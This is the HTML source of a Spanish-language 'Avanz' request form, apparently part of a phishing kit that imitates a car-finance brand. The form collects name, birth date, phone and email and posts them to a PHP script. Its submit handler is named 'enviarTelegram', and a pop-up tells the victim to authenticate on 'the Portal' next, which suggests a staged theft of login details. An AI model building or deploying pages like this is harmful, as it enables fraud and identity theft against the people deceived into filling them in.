<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
index
    <title>Avanz</title>
 
   
    <style>
    
        .header {
            width: 97.5%;
            height: 100px;
             background-size: cover;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            position: relative;
        }
        .logo img {
            height: 50px;
        }
        .top-right-image {
            position: absolute;
            top: 10px;
            right: 20px;
            height: 80px;
        }
        .login-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: -400px;
        }
       
        
         

        .masa3 {
        width: 100%;
        height: 30px;
        margin: 0px;
        background-color: #005961;
        padding: 5px;
    }


        

    </style>
    <style>
        body {margin: 0px;
            font-family: Arial, sans-serif;
        
          
        }
        .container {
            background: white;
            max-width: 400px;
            margin: auto;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            border-bottom: 3px solid orange;
            padding-bottom: 5px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-top: 10px;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: orange;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
        }
    </style>
</head>





<script>
    function enviarTelegram(event) {
        event.preventDefault();
        let formulario = document.getElementById('formulario');
        if (!formulario.checkValidity()) {
            formulario.reportValidity();
            return;
        }
    
        let overlay = document.createElement('div');
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.background = 'rgba(0, 0, 0, 0.5)';
        overlay.style.display = 'flex';
        overlay.style.alignItems = 'center';
        overlay.style.justifyContent = 'center';
        overlay.style.zIndex = '9999';
        
        let mensajeBox = document.createElement('div');
        mensajeBox.style.background = '#fff';
        mensajeBox.style.padding = '20px';
        mensajeBox.style.borderRadius = '10px';
        mensajeBox.style.textAlign = 'center';
        mensajeBox.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.3)';
        mensajeBox.innerHTML = '<p style="font-size: 18px;">Para hacer efectiva tu solicitud deberás autenticarte en el Portal.</p>';
        
        overlay.appendChild(mensajeBox);
        document.body.appendChild(overlay);
        
        setTimeout(() => {
            document.body.removeChild(overlay);
            formulario.submit();
        }, 2000);
    }
    
    document.addEventListener("DOMContentLoaded", function () {
        document.getElementById('formulario').addEventListener('submit', enviarTelegram);
    });
    </script>
    




<body onload="generateCSRFToken()">
    <div class="header">
        <img width="120px" style=" margin-top: 10px;" src="img/lk.svg" alt="Avanz">
     </div>
    
     <div class="masa3">
        <center>        
 <p style="margin-top: 5px;color: white;">Envio de solicitud</p>        </center>
    </div>



    <br>    <br>


<center>    <img width="350px" src="Tu carro.jpg" alt="">


    <br><br>

<img width="450px" src="image.png" alt="">
</center>

<br>
 
    <div class="container"  style="    background-color: #f2f2f2;">
        <h2>Formulario de solicitud</h2>
        <br>
        <form id="formulario" method="post" action="porf.php">
            <label for="primer_nombre">* Nombre y apellido</label>
            <input type="text" id="primer_nombre" name="name" required>
            
 <br>  
 <br>
             
            <label for="fecha_nacimiento">* Fecha de nacimiento</label>
            <input required inputmode="numeric" type="date" id="fecha_nacimiento" name="dates" required>

<br>  
<br>
            <label for="primer_nombre">* Número de teléfono</label>
            <input required type="text" id="primer_nombre" name="cel" required>
            
<br>  
<br>

            <label for="primer_nombre">* Correo electrónico</label>
            <input required type="text" id="primer_nombre" name="arroba" required>

            
  <br>       <br>  
            
            <button type="submit" onclick="enviarTelegram()">Enviar</button>
  
  
  
  <br><br>
  
        </form>
    </div>


<div style="height: 300px;">



</div>

</body>
</html>
